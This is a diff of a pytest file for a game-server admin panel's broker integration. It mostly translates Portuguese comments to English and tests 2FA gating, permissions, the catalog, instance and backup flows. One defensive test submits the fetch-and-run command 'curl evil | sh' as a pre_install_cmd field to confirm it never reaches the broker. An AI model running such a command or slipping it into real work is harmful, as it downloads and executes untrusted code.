@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
-"""Testes da integracao do painel com o broker (criar instancia de jogo, abrir portas).
+"""Tests for the panel's integration with the broker (create a game instance, open ports).
 
     pytest admin/test_broker.py
 
-O broker de verdade nunca e chamado aqui: as funcoes de `broker_client` sao trocadas por um
-falso (`monkeypatch`, que desfaz sozinho). O que se testa e o que e do PAINEL: quem pode
-abrir estas telas, o que ele manda pedir, como acompanha uma operacao demorada e o que
-cadastra no fim - inclusive quando o fim e ruim.
+The real broker is never called here: the `broker_client` functions are swapped for a
+fake (`monkeypatch`, which undoes itself). What is tested is what belongs to the PANEL: who
+may open these screens, what it asks for, how it follows a long-running operation and what
+it registers at the end - including when the end is bad.
 """
 from __future__ import annotations
 
@@ -23,11 +23,11 @@ from gamepanel import navigation as ui
 from gamepanel.security import totp
 
 
-# `broker_required` agora exige o segundo fator DA PESSOA, sempre (ver app.py) - nao so
-# quando GAMEPANEL_REQUIRE_2FA esta ligado. Quase todo teste deste arquivo precisa chegar
-# ATE a view para testar o que quer testar, entao "chefe" AQUI (e so aqui, por causa deste
-# override de fixture) ja vem com o 2FA ativo. Quem quer provar a exigencia em si pede
-# `sem_2fa`, mais abaixo.
+# `broker_required` now always requires the PERSON's second factor (see app.py) - not only
+# when GAMEPANEL_REQUIRE_2FA is on. Almost every test in this file needs to reach
+# the view to test what it wants to test, so "chefe" HERE (and only here, because of this
+# fixture override) already comes with 2FA enabled. Whoever wants to prove the requirement
+# itself asks for `sem_2fa`, further below.
 @pytest.fixture
 def admin(admin_2fa):
     return admin_2fa
@@ -35,7 +35,7 @@ def admin(admin_2fa):
 
 @pytest.fixture
 def admin_without_2fa(login):
-    """Um admin comum, sem o segundo fator - o caso que a exigencia do broker barra."""
+    """A regular admin, without the second factor - the case the broker requirement blocks."""
     panel.ensure_admin_user("sem-2fa", "senha-sem-2fa")
     return login("sem-2fa", "senha-sem-2fa")
 
@@ -59,7 +59,7 @@ INSTANCE = {
                {"base": 7002, "numero": 7002, "proto": "udp", "papel": "query"}],
 }
 
-# O jogo como o GET /v1/catalog/<chave> do broker devolve (as_stored + origem).
+# The game as the broker's GET /v1/catalog/<chave> returns it (as_stored + origin).
 STORED = {
     "key": "meujogo", "name": "Meu Jogo", "app_id": 123456, "platform": "", "start_script": "Server.sh",
     "start_args": "-port={PORT}", "ports": ["7777/udp", "27016/udp"], "game_port": 7777,
@@ -93,7 +93,7 @@ class FakeBroker:
         self.operations: list[dict] = [{"state": "ok", "log": "tudo certo\n", "result": RESULTADO}]
         self.tasks: list = []
         self.forgotten: list[str] = []
-        # O que o DELETE de jogo devolve: {} = apagado; um jogo = curado restaurado.
+        # What the game DELETE returns: {} = deleted; a game = curated one restored.
         self.restored: dict = {}
 
     def _call(self, name: str, *args) -> None:
@@ -156,13 +156,13 @@ class FakeBroker:
 
 @pytest.fixture
 def broker(monkeypatch, database):
-    """Broker ligado no painel e trocado por um falso. As threads NAO sobem: `_dispara`
-    guarda a tarefa em `broker.tarefas` para o teste rodar (ou nao) quando quiser."""
+    """Broker enabled in the panel and swapped for a fake. Threads do NOT start: `_dispara`
+    keeps the task in `broker.tarefas` for the test to run (or not) whenever it wants."""
     fake = FakeBroker()
     monkeypatch.setattr(panel, "ALLOW_BROKER", True)
     monkeypatch.setattr(panel, "BROKER_POLL", 0)
     monkeypatch.setattr(panel, "_fire", fake.tasks.append)
-    # Nunca o known_hosts de verdade: no container ele e o do painel de dev.
+    # Never the real known_hosts: in the container it is the dev panel's.
     monkeypatch.setattr(panel, "forget_host_key", fake.forgotten.append)
     for name in ("catalog", "add_game", "game", "update_game", "remove_game", "instances",
                  "create", "operation", "deactivate", "remove", "preview", "cancel"):
@@ -191,7 +191,7 @@ def servers(database) -> list:
     return database.execute("SELECT * FROM servers ORDER BY id").fetchall()
 
 
-# --------------------------------------------------------------------------- quem abre
+# --------------------------------------------------------------------------- who opens
 
 ROTAS_GET = ["/catalog", "/instances", "/api/v1/catalog/suggestions?q=palworld", "/catalog/alfa/edit"]
 ROTAS_POST = ["/catalog/new", "/instances/new", "/instances/7/deactivate", "/instances/7/delete",
@@ -247,7 +247,7 @@ def test_menu_so_mostra_o_broker_quando_ligado(admin, broker, monkeypatch):
     assert 'href="/catalog"' not in disabled
 
 
-# --------------------------------------------------- 2FA obrigatorio para falar com o broker
+# --------------------------------------------------- 2FA required to talk to the broker
 
 @pytest.mark.parametrize("rota", ["/catalog", "/instances"])
 def test_sem_2fa_a_tela_manda_para_a_ativacao(admin_without_2fa, broker, rota):
@@ -273,8 +273,8 @@ def test_sem_2fa_a_api_json_responde_403_em_vez_de_redirecionar(admin_without_2f
 
 
 def test_allow_broker_desligado_vence_mesmo_para_quem_nao_tem_2fa(admin_without_2fa, monkeypatch):
-    """A ordem dos dois "guardas" de `broker_required` importa: com o recurso inteiro
-    desligado, a mensagem tem de ser sobre isso, nao sobre o 2FA de quem pediu."""
+    """The order of the two "guards" of `broker_required` matters: with the whole feature
+    off, the message has to be about that, not about the requester's 2FA."""
     monkeypatch.setattr(panel, "ALLOW_BROKER", False)
     response = admin_without_2fa.get("/catalog")
     assert response.status_code == 403
@@ -292,8 +292,8 @@ def test_ativar_o_segundo_fator_libera_as_rotas_do_broker(admin_without_2fa, bro
 
 
 def test_operador_leva_403_antes_mesmo_de_chegar_no_guarda_do_2fa(operator, broker):
-    """Admin sem 2FA e barrado; operador (com ou sem 2FA) nem chega la: admin_required
-    empilha por fora, entao a mensagem dele e sobre o papel, nao sobre o 2FA."""
+    """An admin without 2FA is blocked; an operator (with or without 2FA) does not even get
+    there: admin_required stacks outside, so its message is about the role, not the 2FA."""
     response = operator.get("/catalog")
     assert response.status_code == 403
     assert "administradores" in response.get_data(as_text=True)
@@ -309,7 +309,7 @@ def test_itens_visiveis_filtra_por_recurso_e_papel():
     assert "ssh" in keys(admin=False, broker=False)
 
 
-# ------------------------------------------------------------------------- catalogo
+# ------------------------------------------------------------------------- catalog
 
 def test_busca_de_jogo_devolve_a_sugestao_com_o_que_o_broker_precisa(admin, broker):
     response = admin.get("/api/v1/catalog/suggestions?q=satisfactory")
@@ -329,7 +329,7 @@ def test_busca_de_jogo_sem_consulta_devolve_lista_vazia(admin, broker):
 
 
 def test_busca_nao_chama_o_broker(admin, broker):
-    """E uma lista fixa do repositorio: nada de rede, nem para o broker."""
+    """It is a fixed list from the repository: no network, not even to the broker."""
     admin.get("/api/v1/catalog/suggestions?q=palworld")
     assert broker.calls == []
 
@@ -341,8 +341,8 @@ def test_catalogo_traz_o_campo_de_busca(admin, broker):
 
 
 def test_catalogo_manda_para_a_busca_os_jogos_que_ja_tem(admin, broker):
-    """E o que faz buscar um CURADO (o V Rising) responder "ja esta no catalogo" em vez de
-    "nada encontrado". Vai escapado no atributo: um nome com aspas nao pode quebrar a tag."""
+    """It is what makes searching for a CURATED game (V Rising) answer "already in the catalog"
+    instead of "nothing found". It is escaped in the attribute: a name with quotes must not break the tag."""
     html = admin.get("/catalog").get_data(as_text=True)
     raw = re.search(r'data-catalog="([^"]*)"', html)
     assert raw is not None
@@ -369,7 +369,7 @@ def test_catalogo_oferece_um_modelo_por_motor(admin, broker):
     html = admin.get("/catalog").get_data(as_text=True)
     for key in ("unreal-linux", "unreal-windows", "unity-linux", "unity-windows", "source"):
         assert f'<option value="{key}"' in html, key
-    # A descricao cita o nome de mentira que a pessoa tem de trocar (campo da frase).
+    # The description cites the dummy name the person has to replace (a field of the phrase).
     assert "NomeDoProjeto" in html
     assert "{project}" not in html
 
@@ -382,7 +382,7 @@ def test_modelos_saem_no_idioma_da_pessoa(admin, broker, post):
 
 
 def test_catalogo_oferece_o_modelo_de_unreal_com_os_valores_na_marcacao(admin, broker):
-    """O seletor nasce escondido e sem `name` (nao vai no envio); o JS le data-values."""
+    """The selector starts hidden and without `name` (not submitted); the JS reads data-values."""
     html = admin.get("/catalog").get_data(as_text=True)
     assert "data-game-template" in html
     assert "Unreal Engine" in html
@@ -393,7 +393,7 @@ def test_catalogo_oferece_o_modelo_de_unreal_com_os_valores_na_marcacao(admin, b
 def test_catalogo_lista_os_jogos_e_o_motivo_de_nao_criar(admin, broker):
     html = admin.get("/catalog").get_data(as_text=True)
     assert "Alfa" in html
-    assert "criavel" in html
+    assert "criável" in html
     assert "exige conta Steam" in html
 
 
@@ -430,8 +430,8 @@ def test_novo_jogo_manda_ao_broker_so_dados_ja_convertidos(admin, broker, post):
 
 
 def test_novo_jogo_nunca_envia_campo_de_comando(admin, broker, post):
-    """O painel so repassa os campos do formulario: nada que o usuario invente na mao
-    (pre_install_cmd, por exemplo) chega ao broker."""
+    """The panel only forwards the form fields: nothing the user makes up by hand
+    (pre_install_cmd, for example) reaches the broker."""
     post(admin, "/catalog/new", {**GAME_FORM, "pre_install_cmd": "curl evil | sh",
                                      "post_install_cmd": "reboot"})
     (_, sent, _), = broker.called("add_game")
@@ -464,14 +464,14 @@ def test_recusa_do_broker_volta_ao_formulario_com_o_que_foi_digitado(admin, brok
 
 
 def test_novo_jogo_registra_qual_jogo_foi_no_historico_e_no_aviso(admin, broker, post, database):
-    """O formulario manda key/name; o historico lia chave/nome e gravava a acao sem o jogo."""
+    """The form sends key/name; the history read chave/nome and saved the action without the game."""
     response = post(admin, "/catalog/new", GAME_FORM)
     (line,) = jobs(database)
     assert line["command"] == "meujogo"
     assert "Meu Jogo" in admin.get(response.headers["Location"]).get_data(as_text=True)
 
 
-# ------------------------------------------------------------------ editar e apagar jogo
+# ------------------------------------------------------------------ edit and delete game
 
 def test_catalogo_oferece_editar_e_apagar_so_onde_cabe(admin, broker):
     broker.games = [*GAMES, {**GAMES[0], "key": "meujogo", "name": "Meu Jogo", "source": "dinamico"},
@@ -497,8 +497,8 @@ def test_editar_abre_o_formulario_preenchido_com_o_que_o_broker_guarda(admin, br
 
 
 def test_editar_jogo_curado_abre_com_o_aviso_do_arquivo_do_repositorio(admin, broker, monkeypatch):
-    """Era 500 em producao: a frase do curado tinha o campo `{key}`, que colide com o
-    primeiro parametro de `translate`. O teste de cima abre um DINAMICO, que usa outra frase."""
+    """It was a 500 in production: the curated phrase had the `{key}` field, which collides
+    with the first parameter of `translate`. The test above opens a DYNAMIC one, which uses another phrase."""
     monkeypatch.setattr(panel.broker_client, "game", lambda key: {**STORED, "key": key, "source": "curado"})
     response = admin.get("/catalog/alfa/edit")
     assert response.status_code == 200
@@ -528,7 +528,7 @@ def test_apagar_dinamico(admin, broker, post, database):
     response = post(admin, "/catalog/meujogo/delete", {})
     assert response.status_code == 302
     assert broker.called("remove_game") == [("remove_game", "meujogo", "chefe")]
-    assert "apagado do catalogo" in admin.get("/catalog").get_data(as_text=True)
+    assert "apagado do catálogo" in admin.get("/catalog").get_data(as_text=True)
     (line,) = jobs(database)
     assert (line["action"], line["status"]) == ("broker-jogo-apagar", "ok")
 
@@ -536,7 +536,7 @@ def test_apagar_dinamico(admin, broker, post, database):
 def test_apagar_curado_editado_avisa_que_voltou_ao_arquivo(admin, broker, post):
     broker.restored = {"key": "alfa", "name": "Alfa"}
     post(admin, "/catalog/alfa/delete", {})
-    assert "vale de novo o arquivo do repositorio" in admin.get("/catalog").get_data(as_text=True)
+    assert "vale de novo o arquivo do repositório" in admin.get("/catalog").get_data(as_text=True)
 
 
 def test_recusa_ao_apagar_aparece_e_fica_no_historico(admin, broker, post, database):
@@ -547,7 +547,7 @@ def test_recusa_ao_apagar_aparece_e_fica_no_historico(admin, broker, post, datab
     assert (line["action"], line["status"]) == ("broker-jogo-apagar", "error")
 
 
-# ---------------------------------------------------------------------------- instancias
+# ---------------------------------------------------------------------------- instances
 
 def test_instancias_mostra_a_lista_e_so_jogos_criaveis_no_formulario(admin, broker):
     html = admin.get("/instances").get_data(as_text=True)
@@ -602,12 +602,12 @@ def test_tela_do_job_abre_e_tem_o_rotulo(admin, broker, post, database):
     post(admin, "/instances/new", {"game": "alfa", "name": "x", "confirmed": "1"})
     (line,) = jobs(database)
     html = admin.get(f"/jobs/{line['id']}").get_data(as_text=True)
-    assert "Instancia criada (broker)" in html
+    assert "Instância criada (broker)" in html
     assert admin.get(f"/api/v1/jobs/{line['id']}").get_json()["status"] == "running"
 
 
 def test_saida_do_job_do_broker_e_so_de_admin(admin, operator, broker, post, database):
-    """A saida cita IP, CTID e portas da infraestrutura: operador nem abre nem lista."""
+    """The output cites the infrastructure's IP, CTID and ports: operators neither open nor list it."""
     post(admin, "/instances/new", {"game": "alfa", "name": "x", "confirmed": "1"})
     (line,) = jobs(database)
     assert operator.get(f"/jobs/{line['id']}").status_code == 403
@@ -617,7 +617,7 @@ def test_saida_do_job_do_broker_e_so_de_admin(admin, operator, broker, post, dat
     assert link not in operator.get("/history").get_data(as_text=True)
 
 
-# ------------------------------------------------------------- acompanhar a operacao
+# ------------------------------------------------------------- following the operation
 
 def test_o_log_aparece_no_job_enquanto_a_operacao_ainda_roda(broker, database):
     broker.operations = [
@@ -651,8 +651,8 @@ def test_operacao_ok_cadastra_o_servidor_e_liga_o_job_a_ele(broker, database):
 
 
 def test_ip_reaproveitado_esquece_a_chave_ssh_do_ct_antigo(broker, database):
-    """O broker reusa o IP de instancia removida; sem isto o CT novo nascia com
-    'REMOTE HOST IDENTIFICATION HAS CHANGED' em toda chamada SSH."""
+    """The broker reuses the IP of a removed instance; without this the new CT was born with
+    'REMOTE HOST IDENTIFICATION HAS CHANGED' on every SSH call."""
     panel.follow_operation(new_job(database), OP, sleep=lambda _s: None)
     assert broker.forgotten == ["10.0.0.30"]
 
@@ -737,7 +737,7 @@ def test_tarefa_disparada_pela_rota_faz_o_caminho_inteiro(admin, broker, post, d
     assert servers(database)[0]["broker_id"] == 7
 
 
-# ------------------------------------------------------ retomar depois de um restart
+# ------------------------------------------------------ resuming after a restart
 
 def test_restart_retoma_o_que_ainda_estava_rodando(broker, database):
     running = new_job(database, op="b" * 32)
@@ -760,7 +760,7 @@ def test_broker_desligado_nao_retoma_nada(broker, database, monkeypatch):
     assert broker.tasks == []
 
 
-# ---------------------------------------------------------- desativar e remover
+# ---------------------------------------------------------- deactivate and remove
 
 def test_desativar_pede_ao_broker_e_deixa_rastro(admin, broker, post, database):
     response = post(admin, "/instances/7/deactivate")
@@ -785,7 +785,7 @@ def captured_job(monkeypatch):
 
 
 def test_desativar_tira_o_backup_para_o_painel_antes(admin, broker, post, captured_job, monkeypatch):
-    # Depois de desativado o CT esta parado e nao ha SSH: e a ultima hora de guardar o save.
+    # Once deactivated the CT is stopped and there is no SSH: it is the last chance to keep the save.
     _bound_server_with_save()
     response = post(admin, "/instances/7/deactivate")
     assert response.headers["Location"].endswith("/jobs/1")
@@ -796,7 +796,7 @@ def test_desativar_tira_o_backup_para_o_painel_antes(admin, broker, post, captur
     assert "backup pronto" in steps[0], "primeiro o backup no container"
     assert steps[1] is panel.pull_new_backup_step, "depois a copia no painel"
 
-    # Backup que nao anuncia o arquivo: nada chega ao painel, e a instancia NAO e desativada.
+    # A backup that does not announce the file: nothing reaches the panel, and the instance is NOT deactivated.
     monkeypatch.setattr(panel, "ssh_run", lambda *a, **k: subprocess.CompletedProcess([], 0, "", ""))
     assert panel._run_steps(server, steps, 5)[1] == "error"
     assert broker.called("deactivate") == []
@@ -816,18 +816,18 @@ def test_desativar_sem_backup_vai_direto(admin, broker, post, captured_job):
 def test_desativar_instancia_sem_o_que_guardar_avisa(admin, broker, post, captured_job):
     post(admin, "/instances/7/deactivate")
     assert broker.called("deactivate") == [("deactivate", 7, "chefe")]
-    assert "SEM copia do save" in admin.get("/instances").get_data(as_text=True)
+    assert "SEM cópia do save" in admin.get("/instances").get_data(as_text=True)
 
 
 def test_remover_mostra_quantas_copias_o_painel_tem(admin, broker, monkeypatch, tmp_path):
     monkeypatch.setattr(panel, "PANEL_BACKUP_DIR", str(tmp_path))
     broker.lista = [{**INSTANCE, "state": "desativada"}]
     html = admin.get("/instances").get_data(as_text=True)
-    assert "Nenhuma copia do save no painel" in html
+    assert "Nenhuma cópia do save no painel" in html
     (tmp_path / "alfa").mkdir()
     (tmp_path / "alfa" / "alfa-20260101-120000.tar.gz").write_bytes(b"x")
     html = admin.get("/instances").get_data(as_text=True)
-    assert "Copias do save no painel: 1" in html
+    assert "Cópias do save no painel: 1" in html
 
 
 def test_desativar_recusado_mostra_o_motivo(admin, broker, post, database):
@@ -865,7 +865,7 @@ def test_remover_sem_marcar_somente_banco_manda_falso(admin, broker, post):
     assert broker.called("remove")[0][4] is False
 
 
-# ------------------------------------------------------------------- esquema e config
+# ------------------------------------------------------------------- schema and config
 
 def test_colunas_novas_existem(database):
     servers = {r["name"] for r in database.execute("PRAGMA table_info(servers)")}
@@ -922,7 +922,7 @@ def test_config_ruim_desliga_o_recurso_sem_derrubar_o_painel(broker_environment,
     assert panel._configure_broker() is False
 
 
-# ------------------------------------------------ previa, log e cancelamento
+# ------------------------------------------------ preview, log and cancellation
 
 def test_criar_mostra_ct_e_ip_antes_e_nao_cria_nada(admin, broker, post, database):
     response = post(admin, "/instances/new", {"game": "alfa", "name": "Servidor do Zeca"})
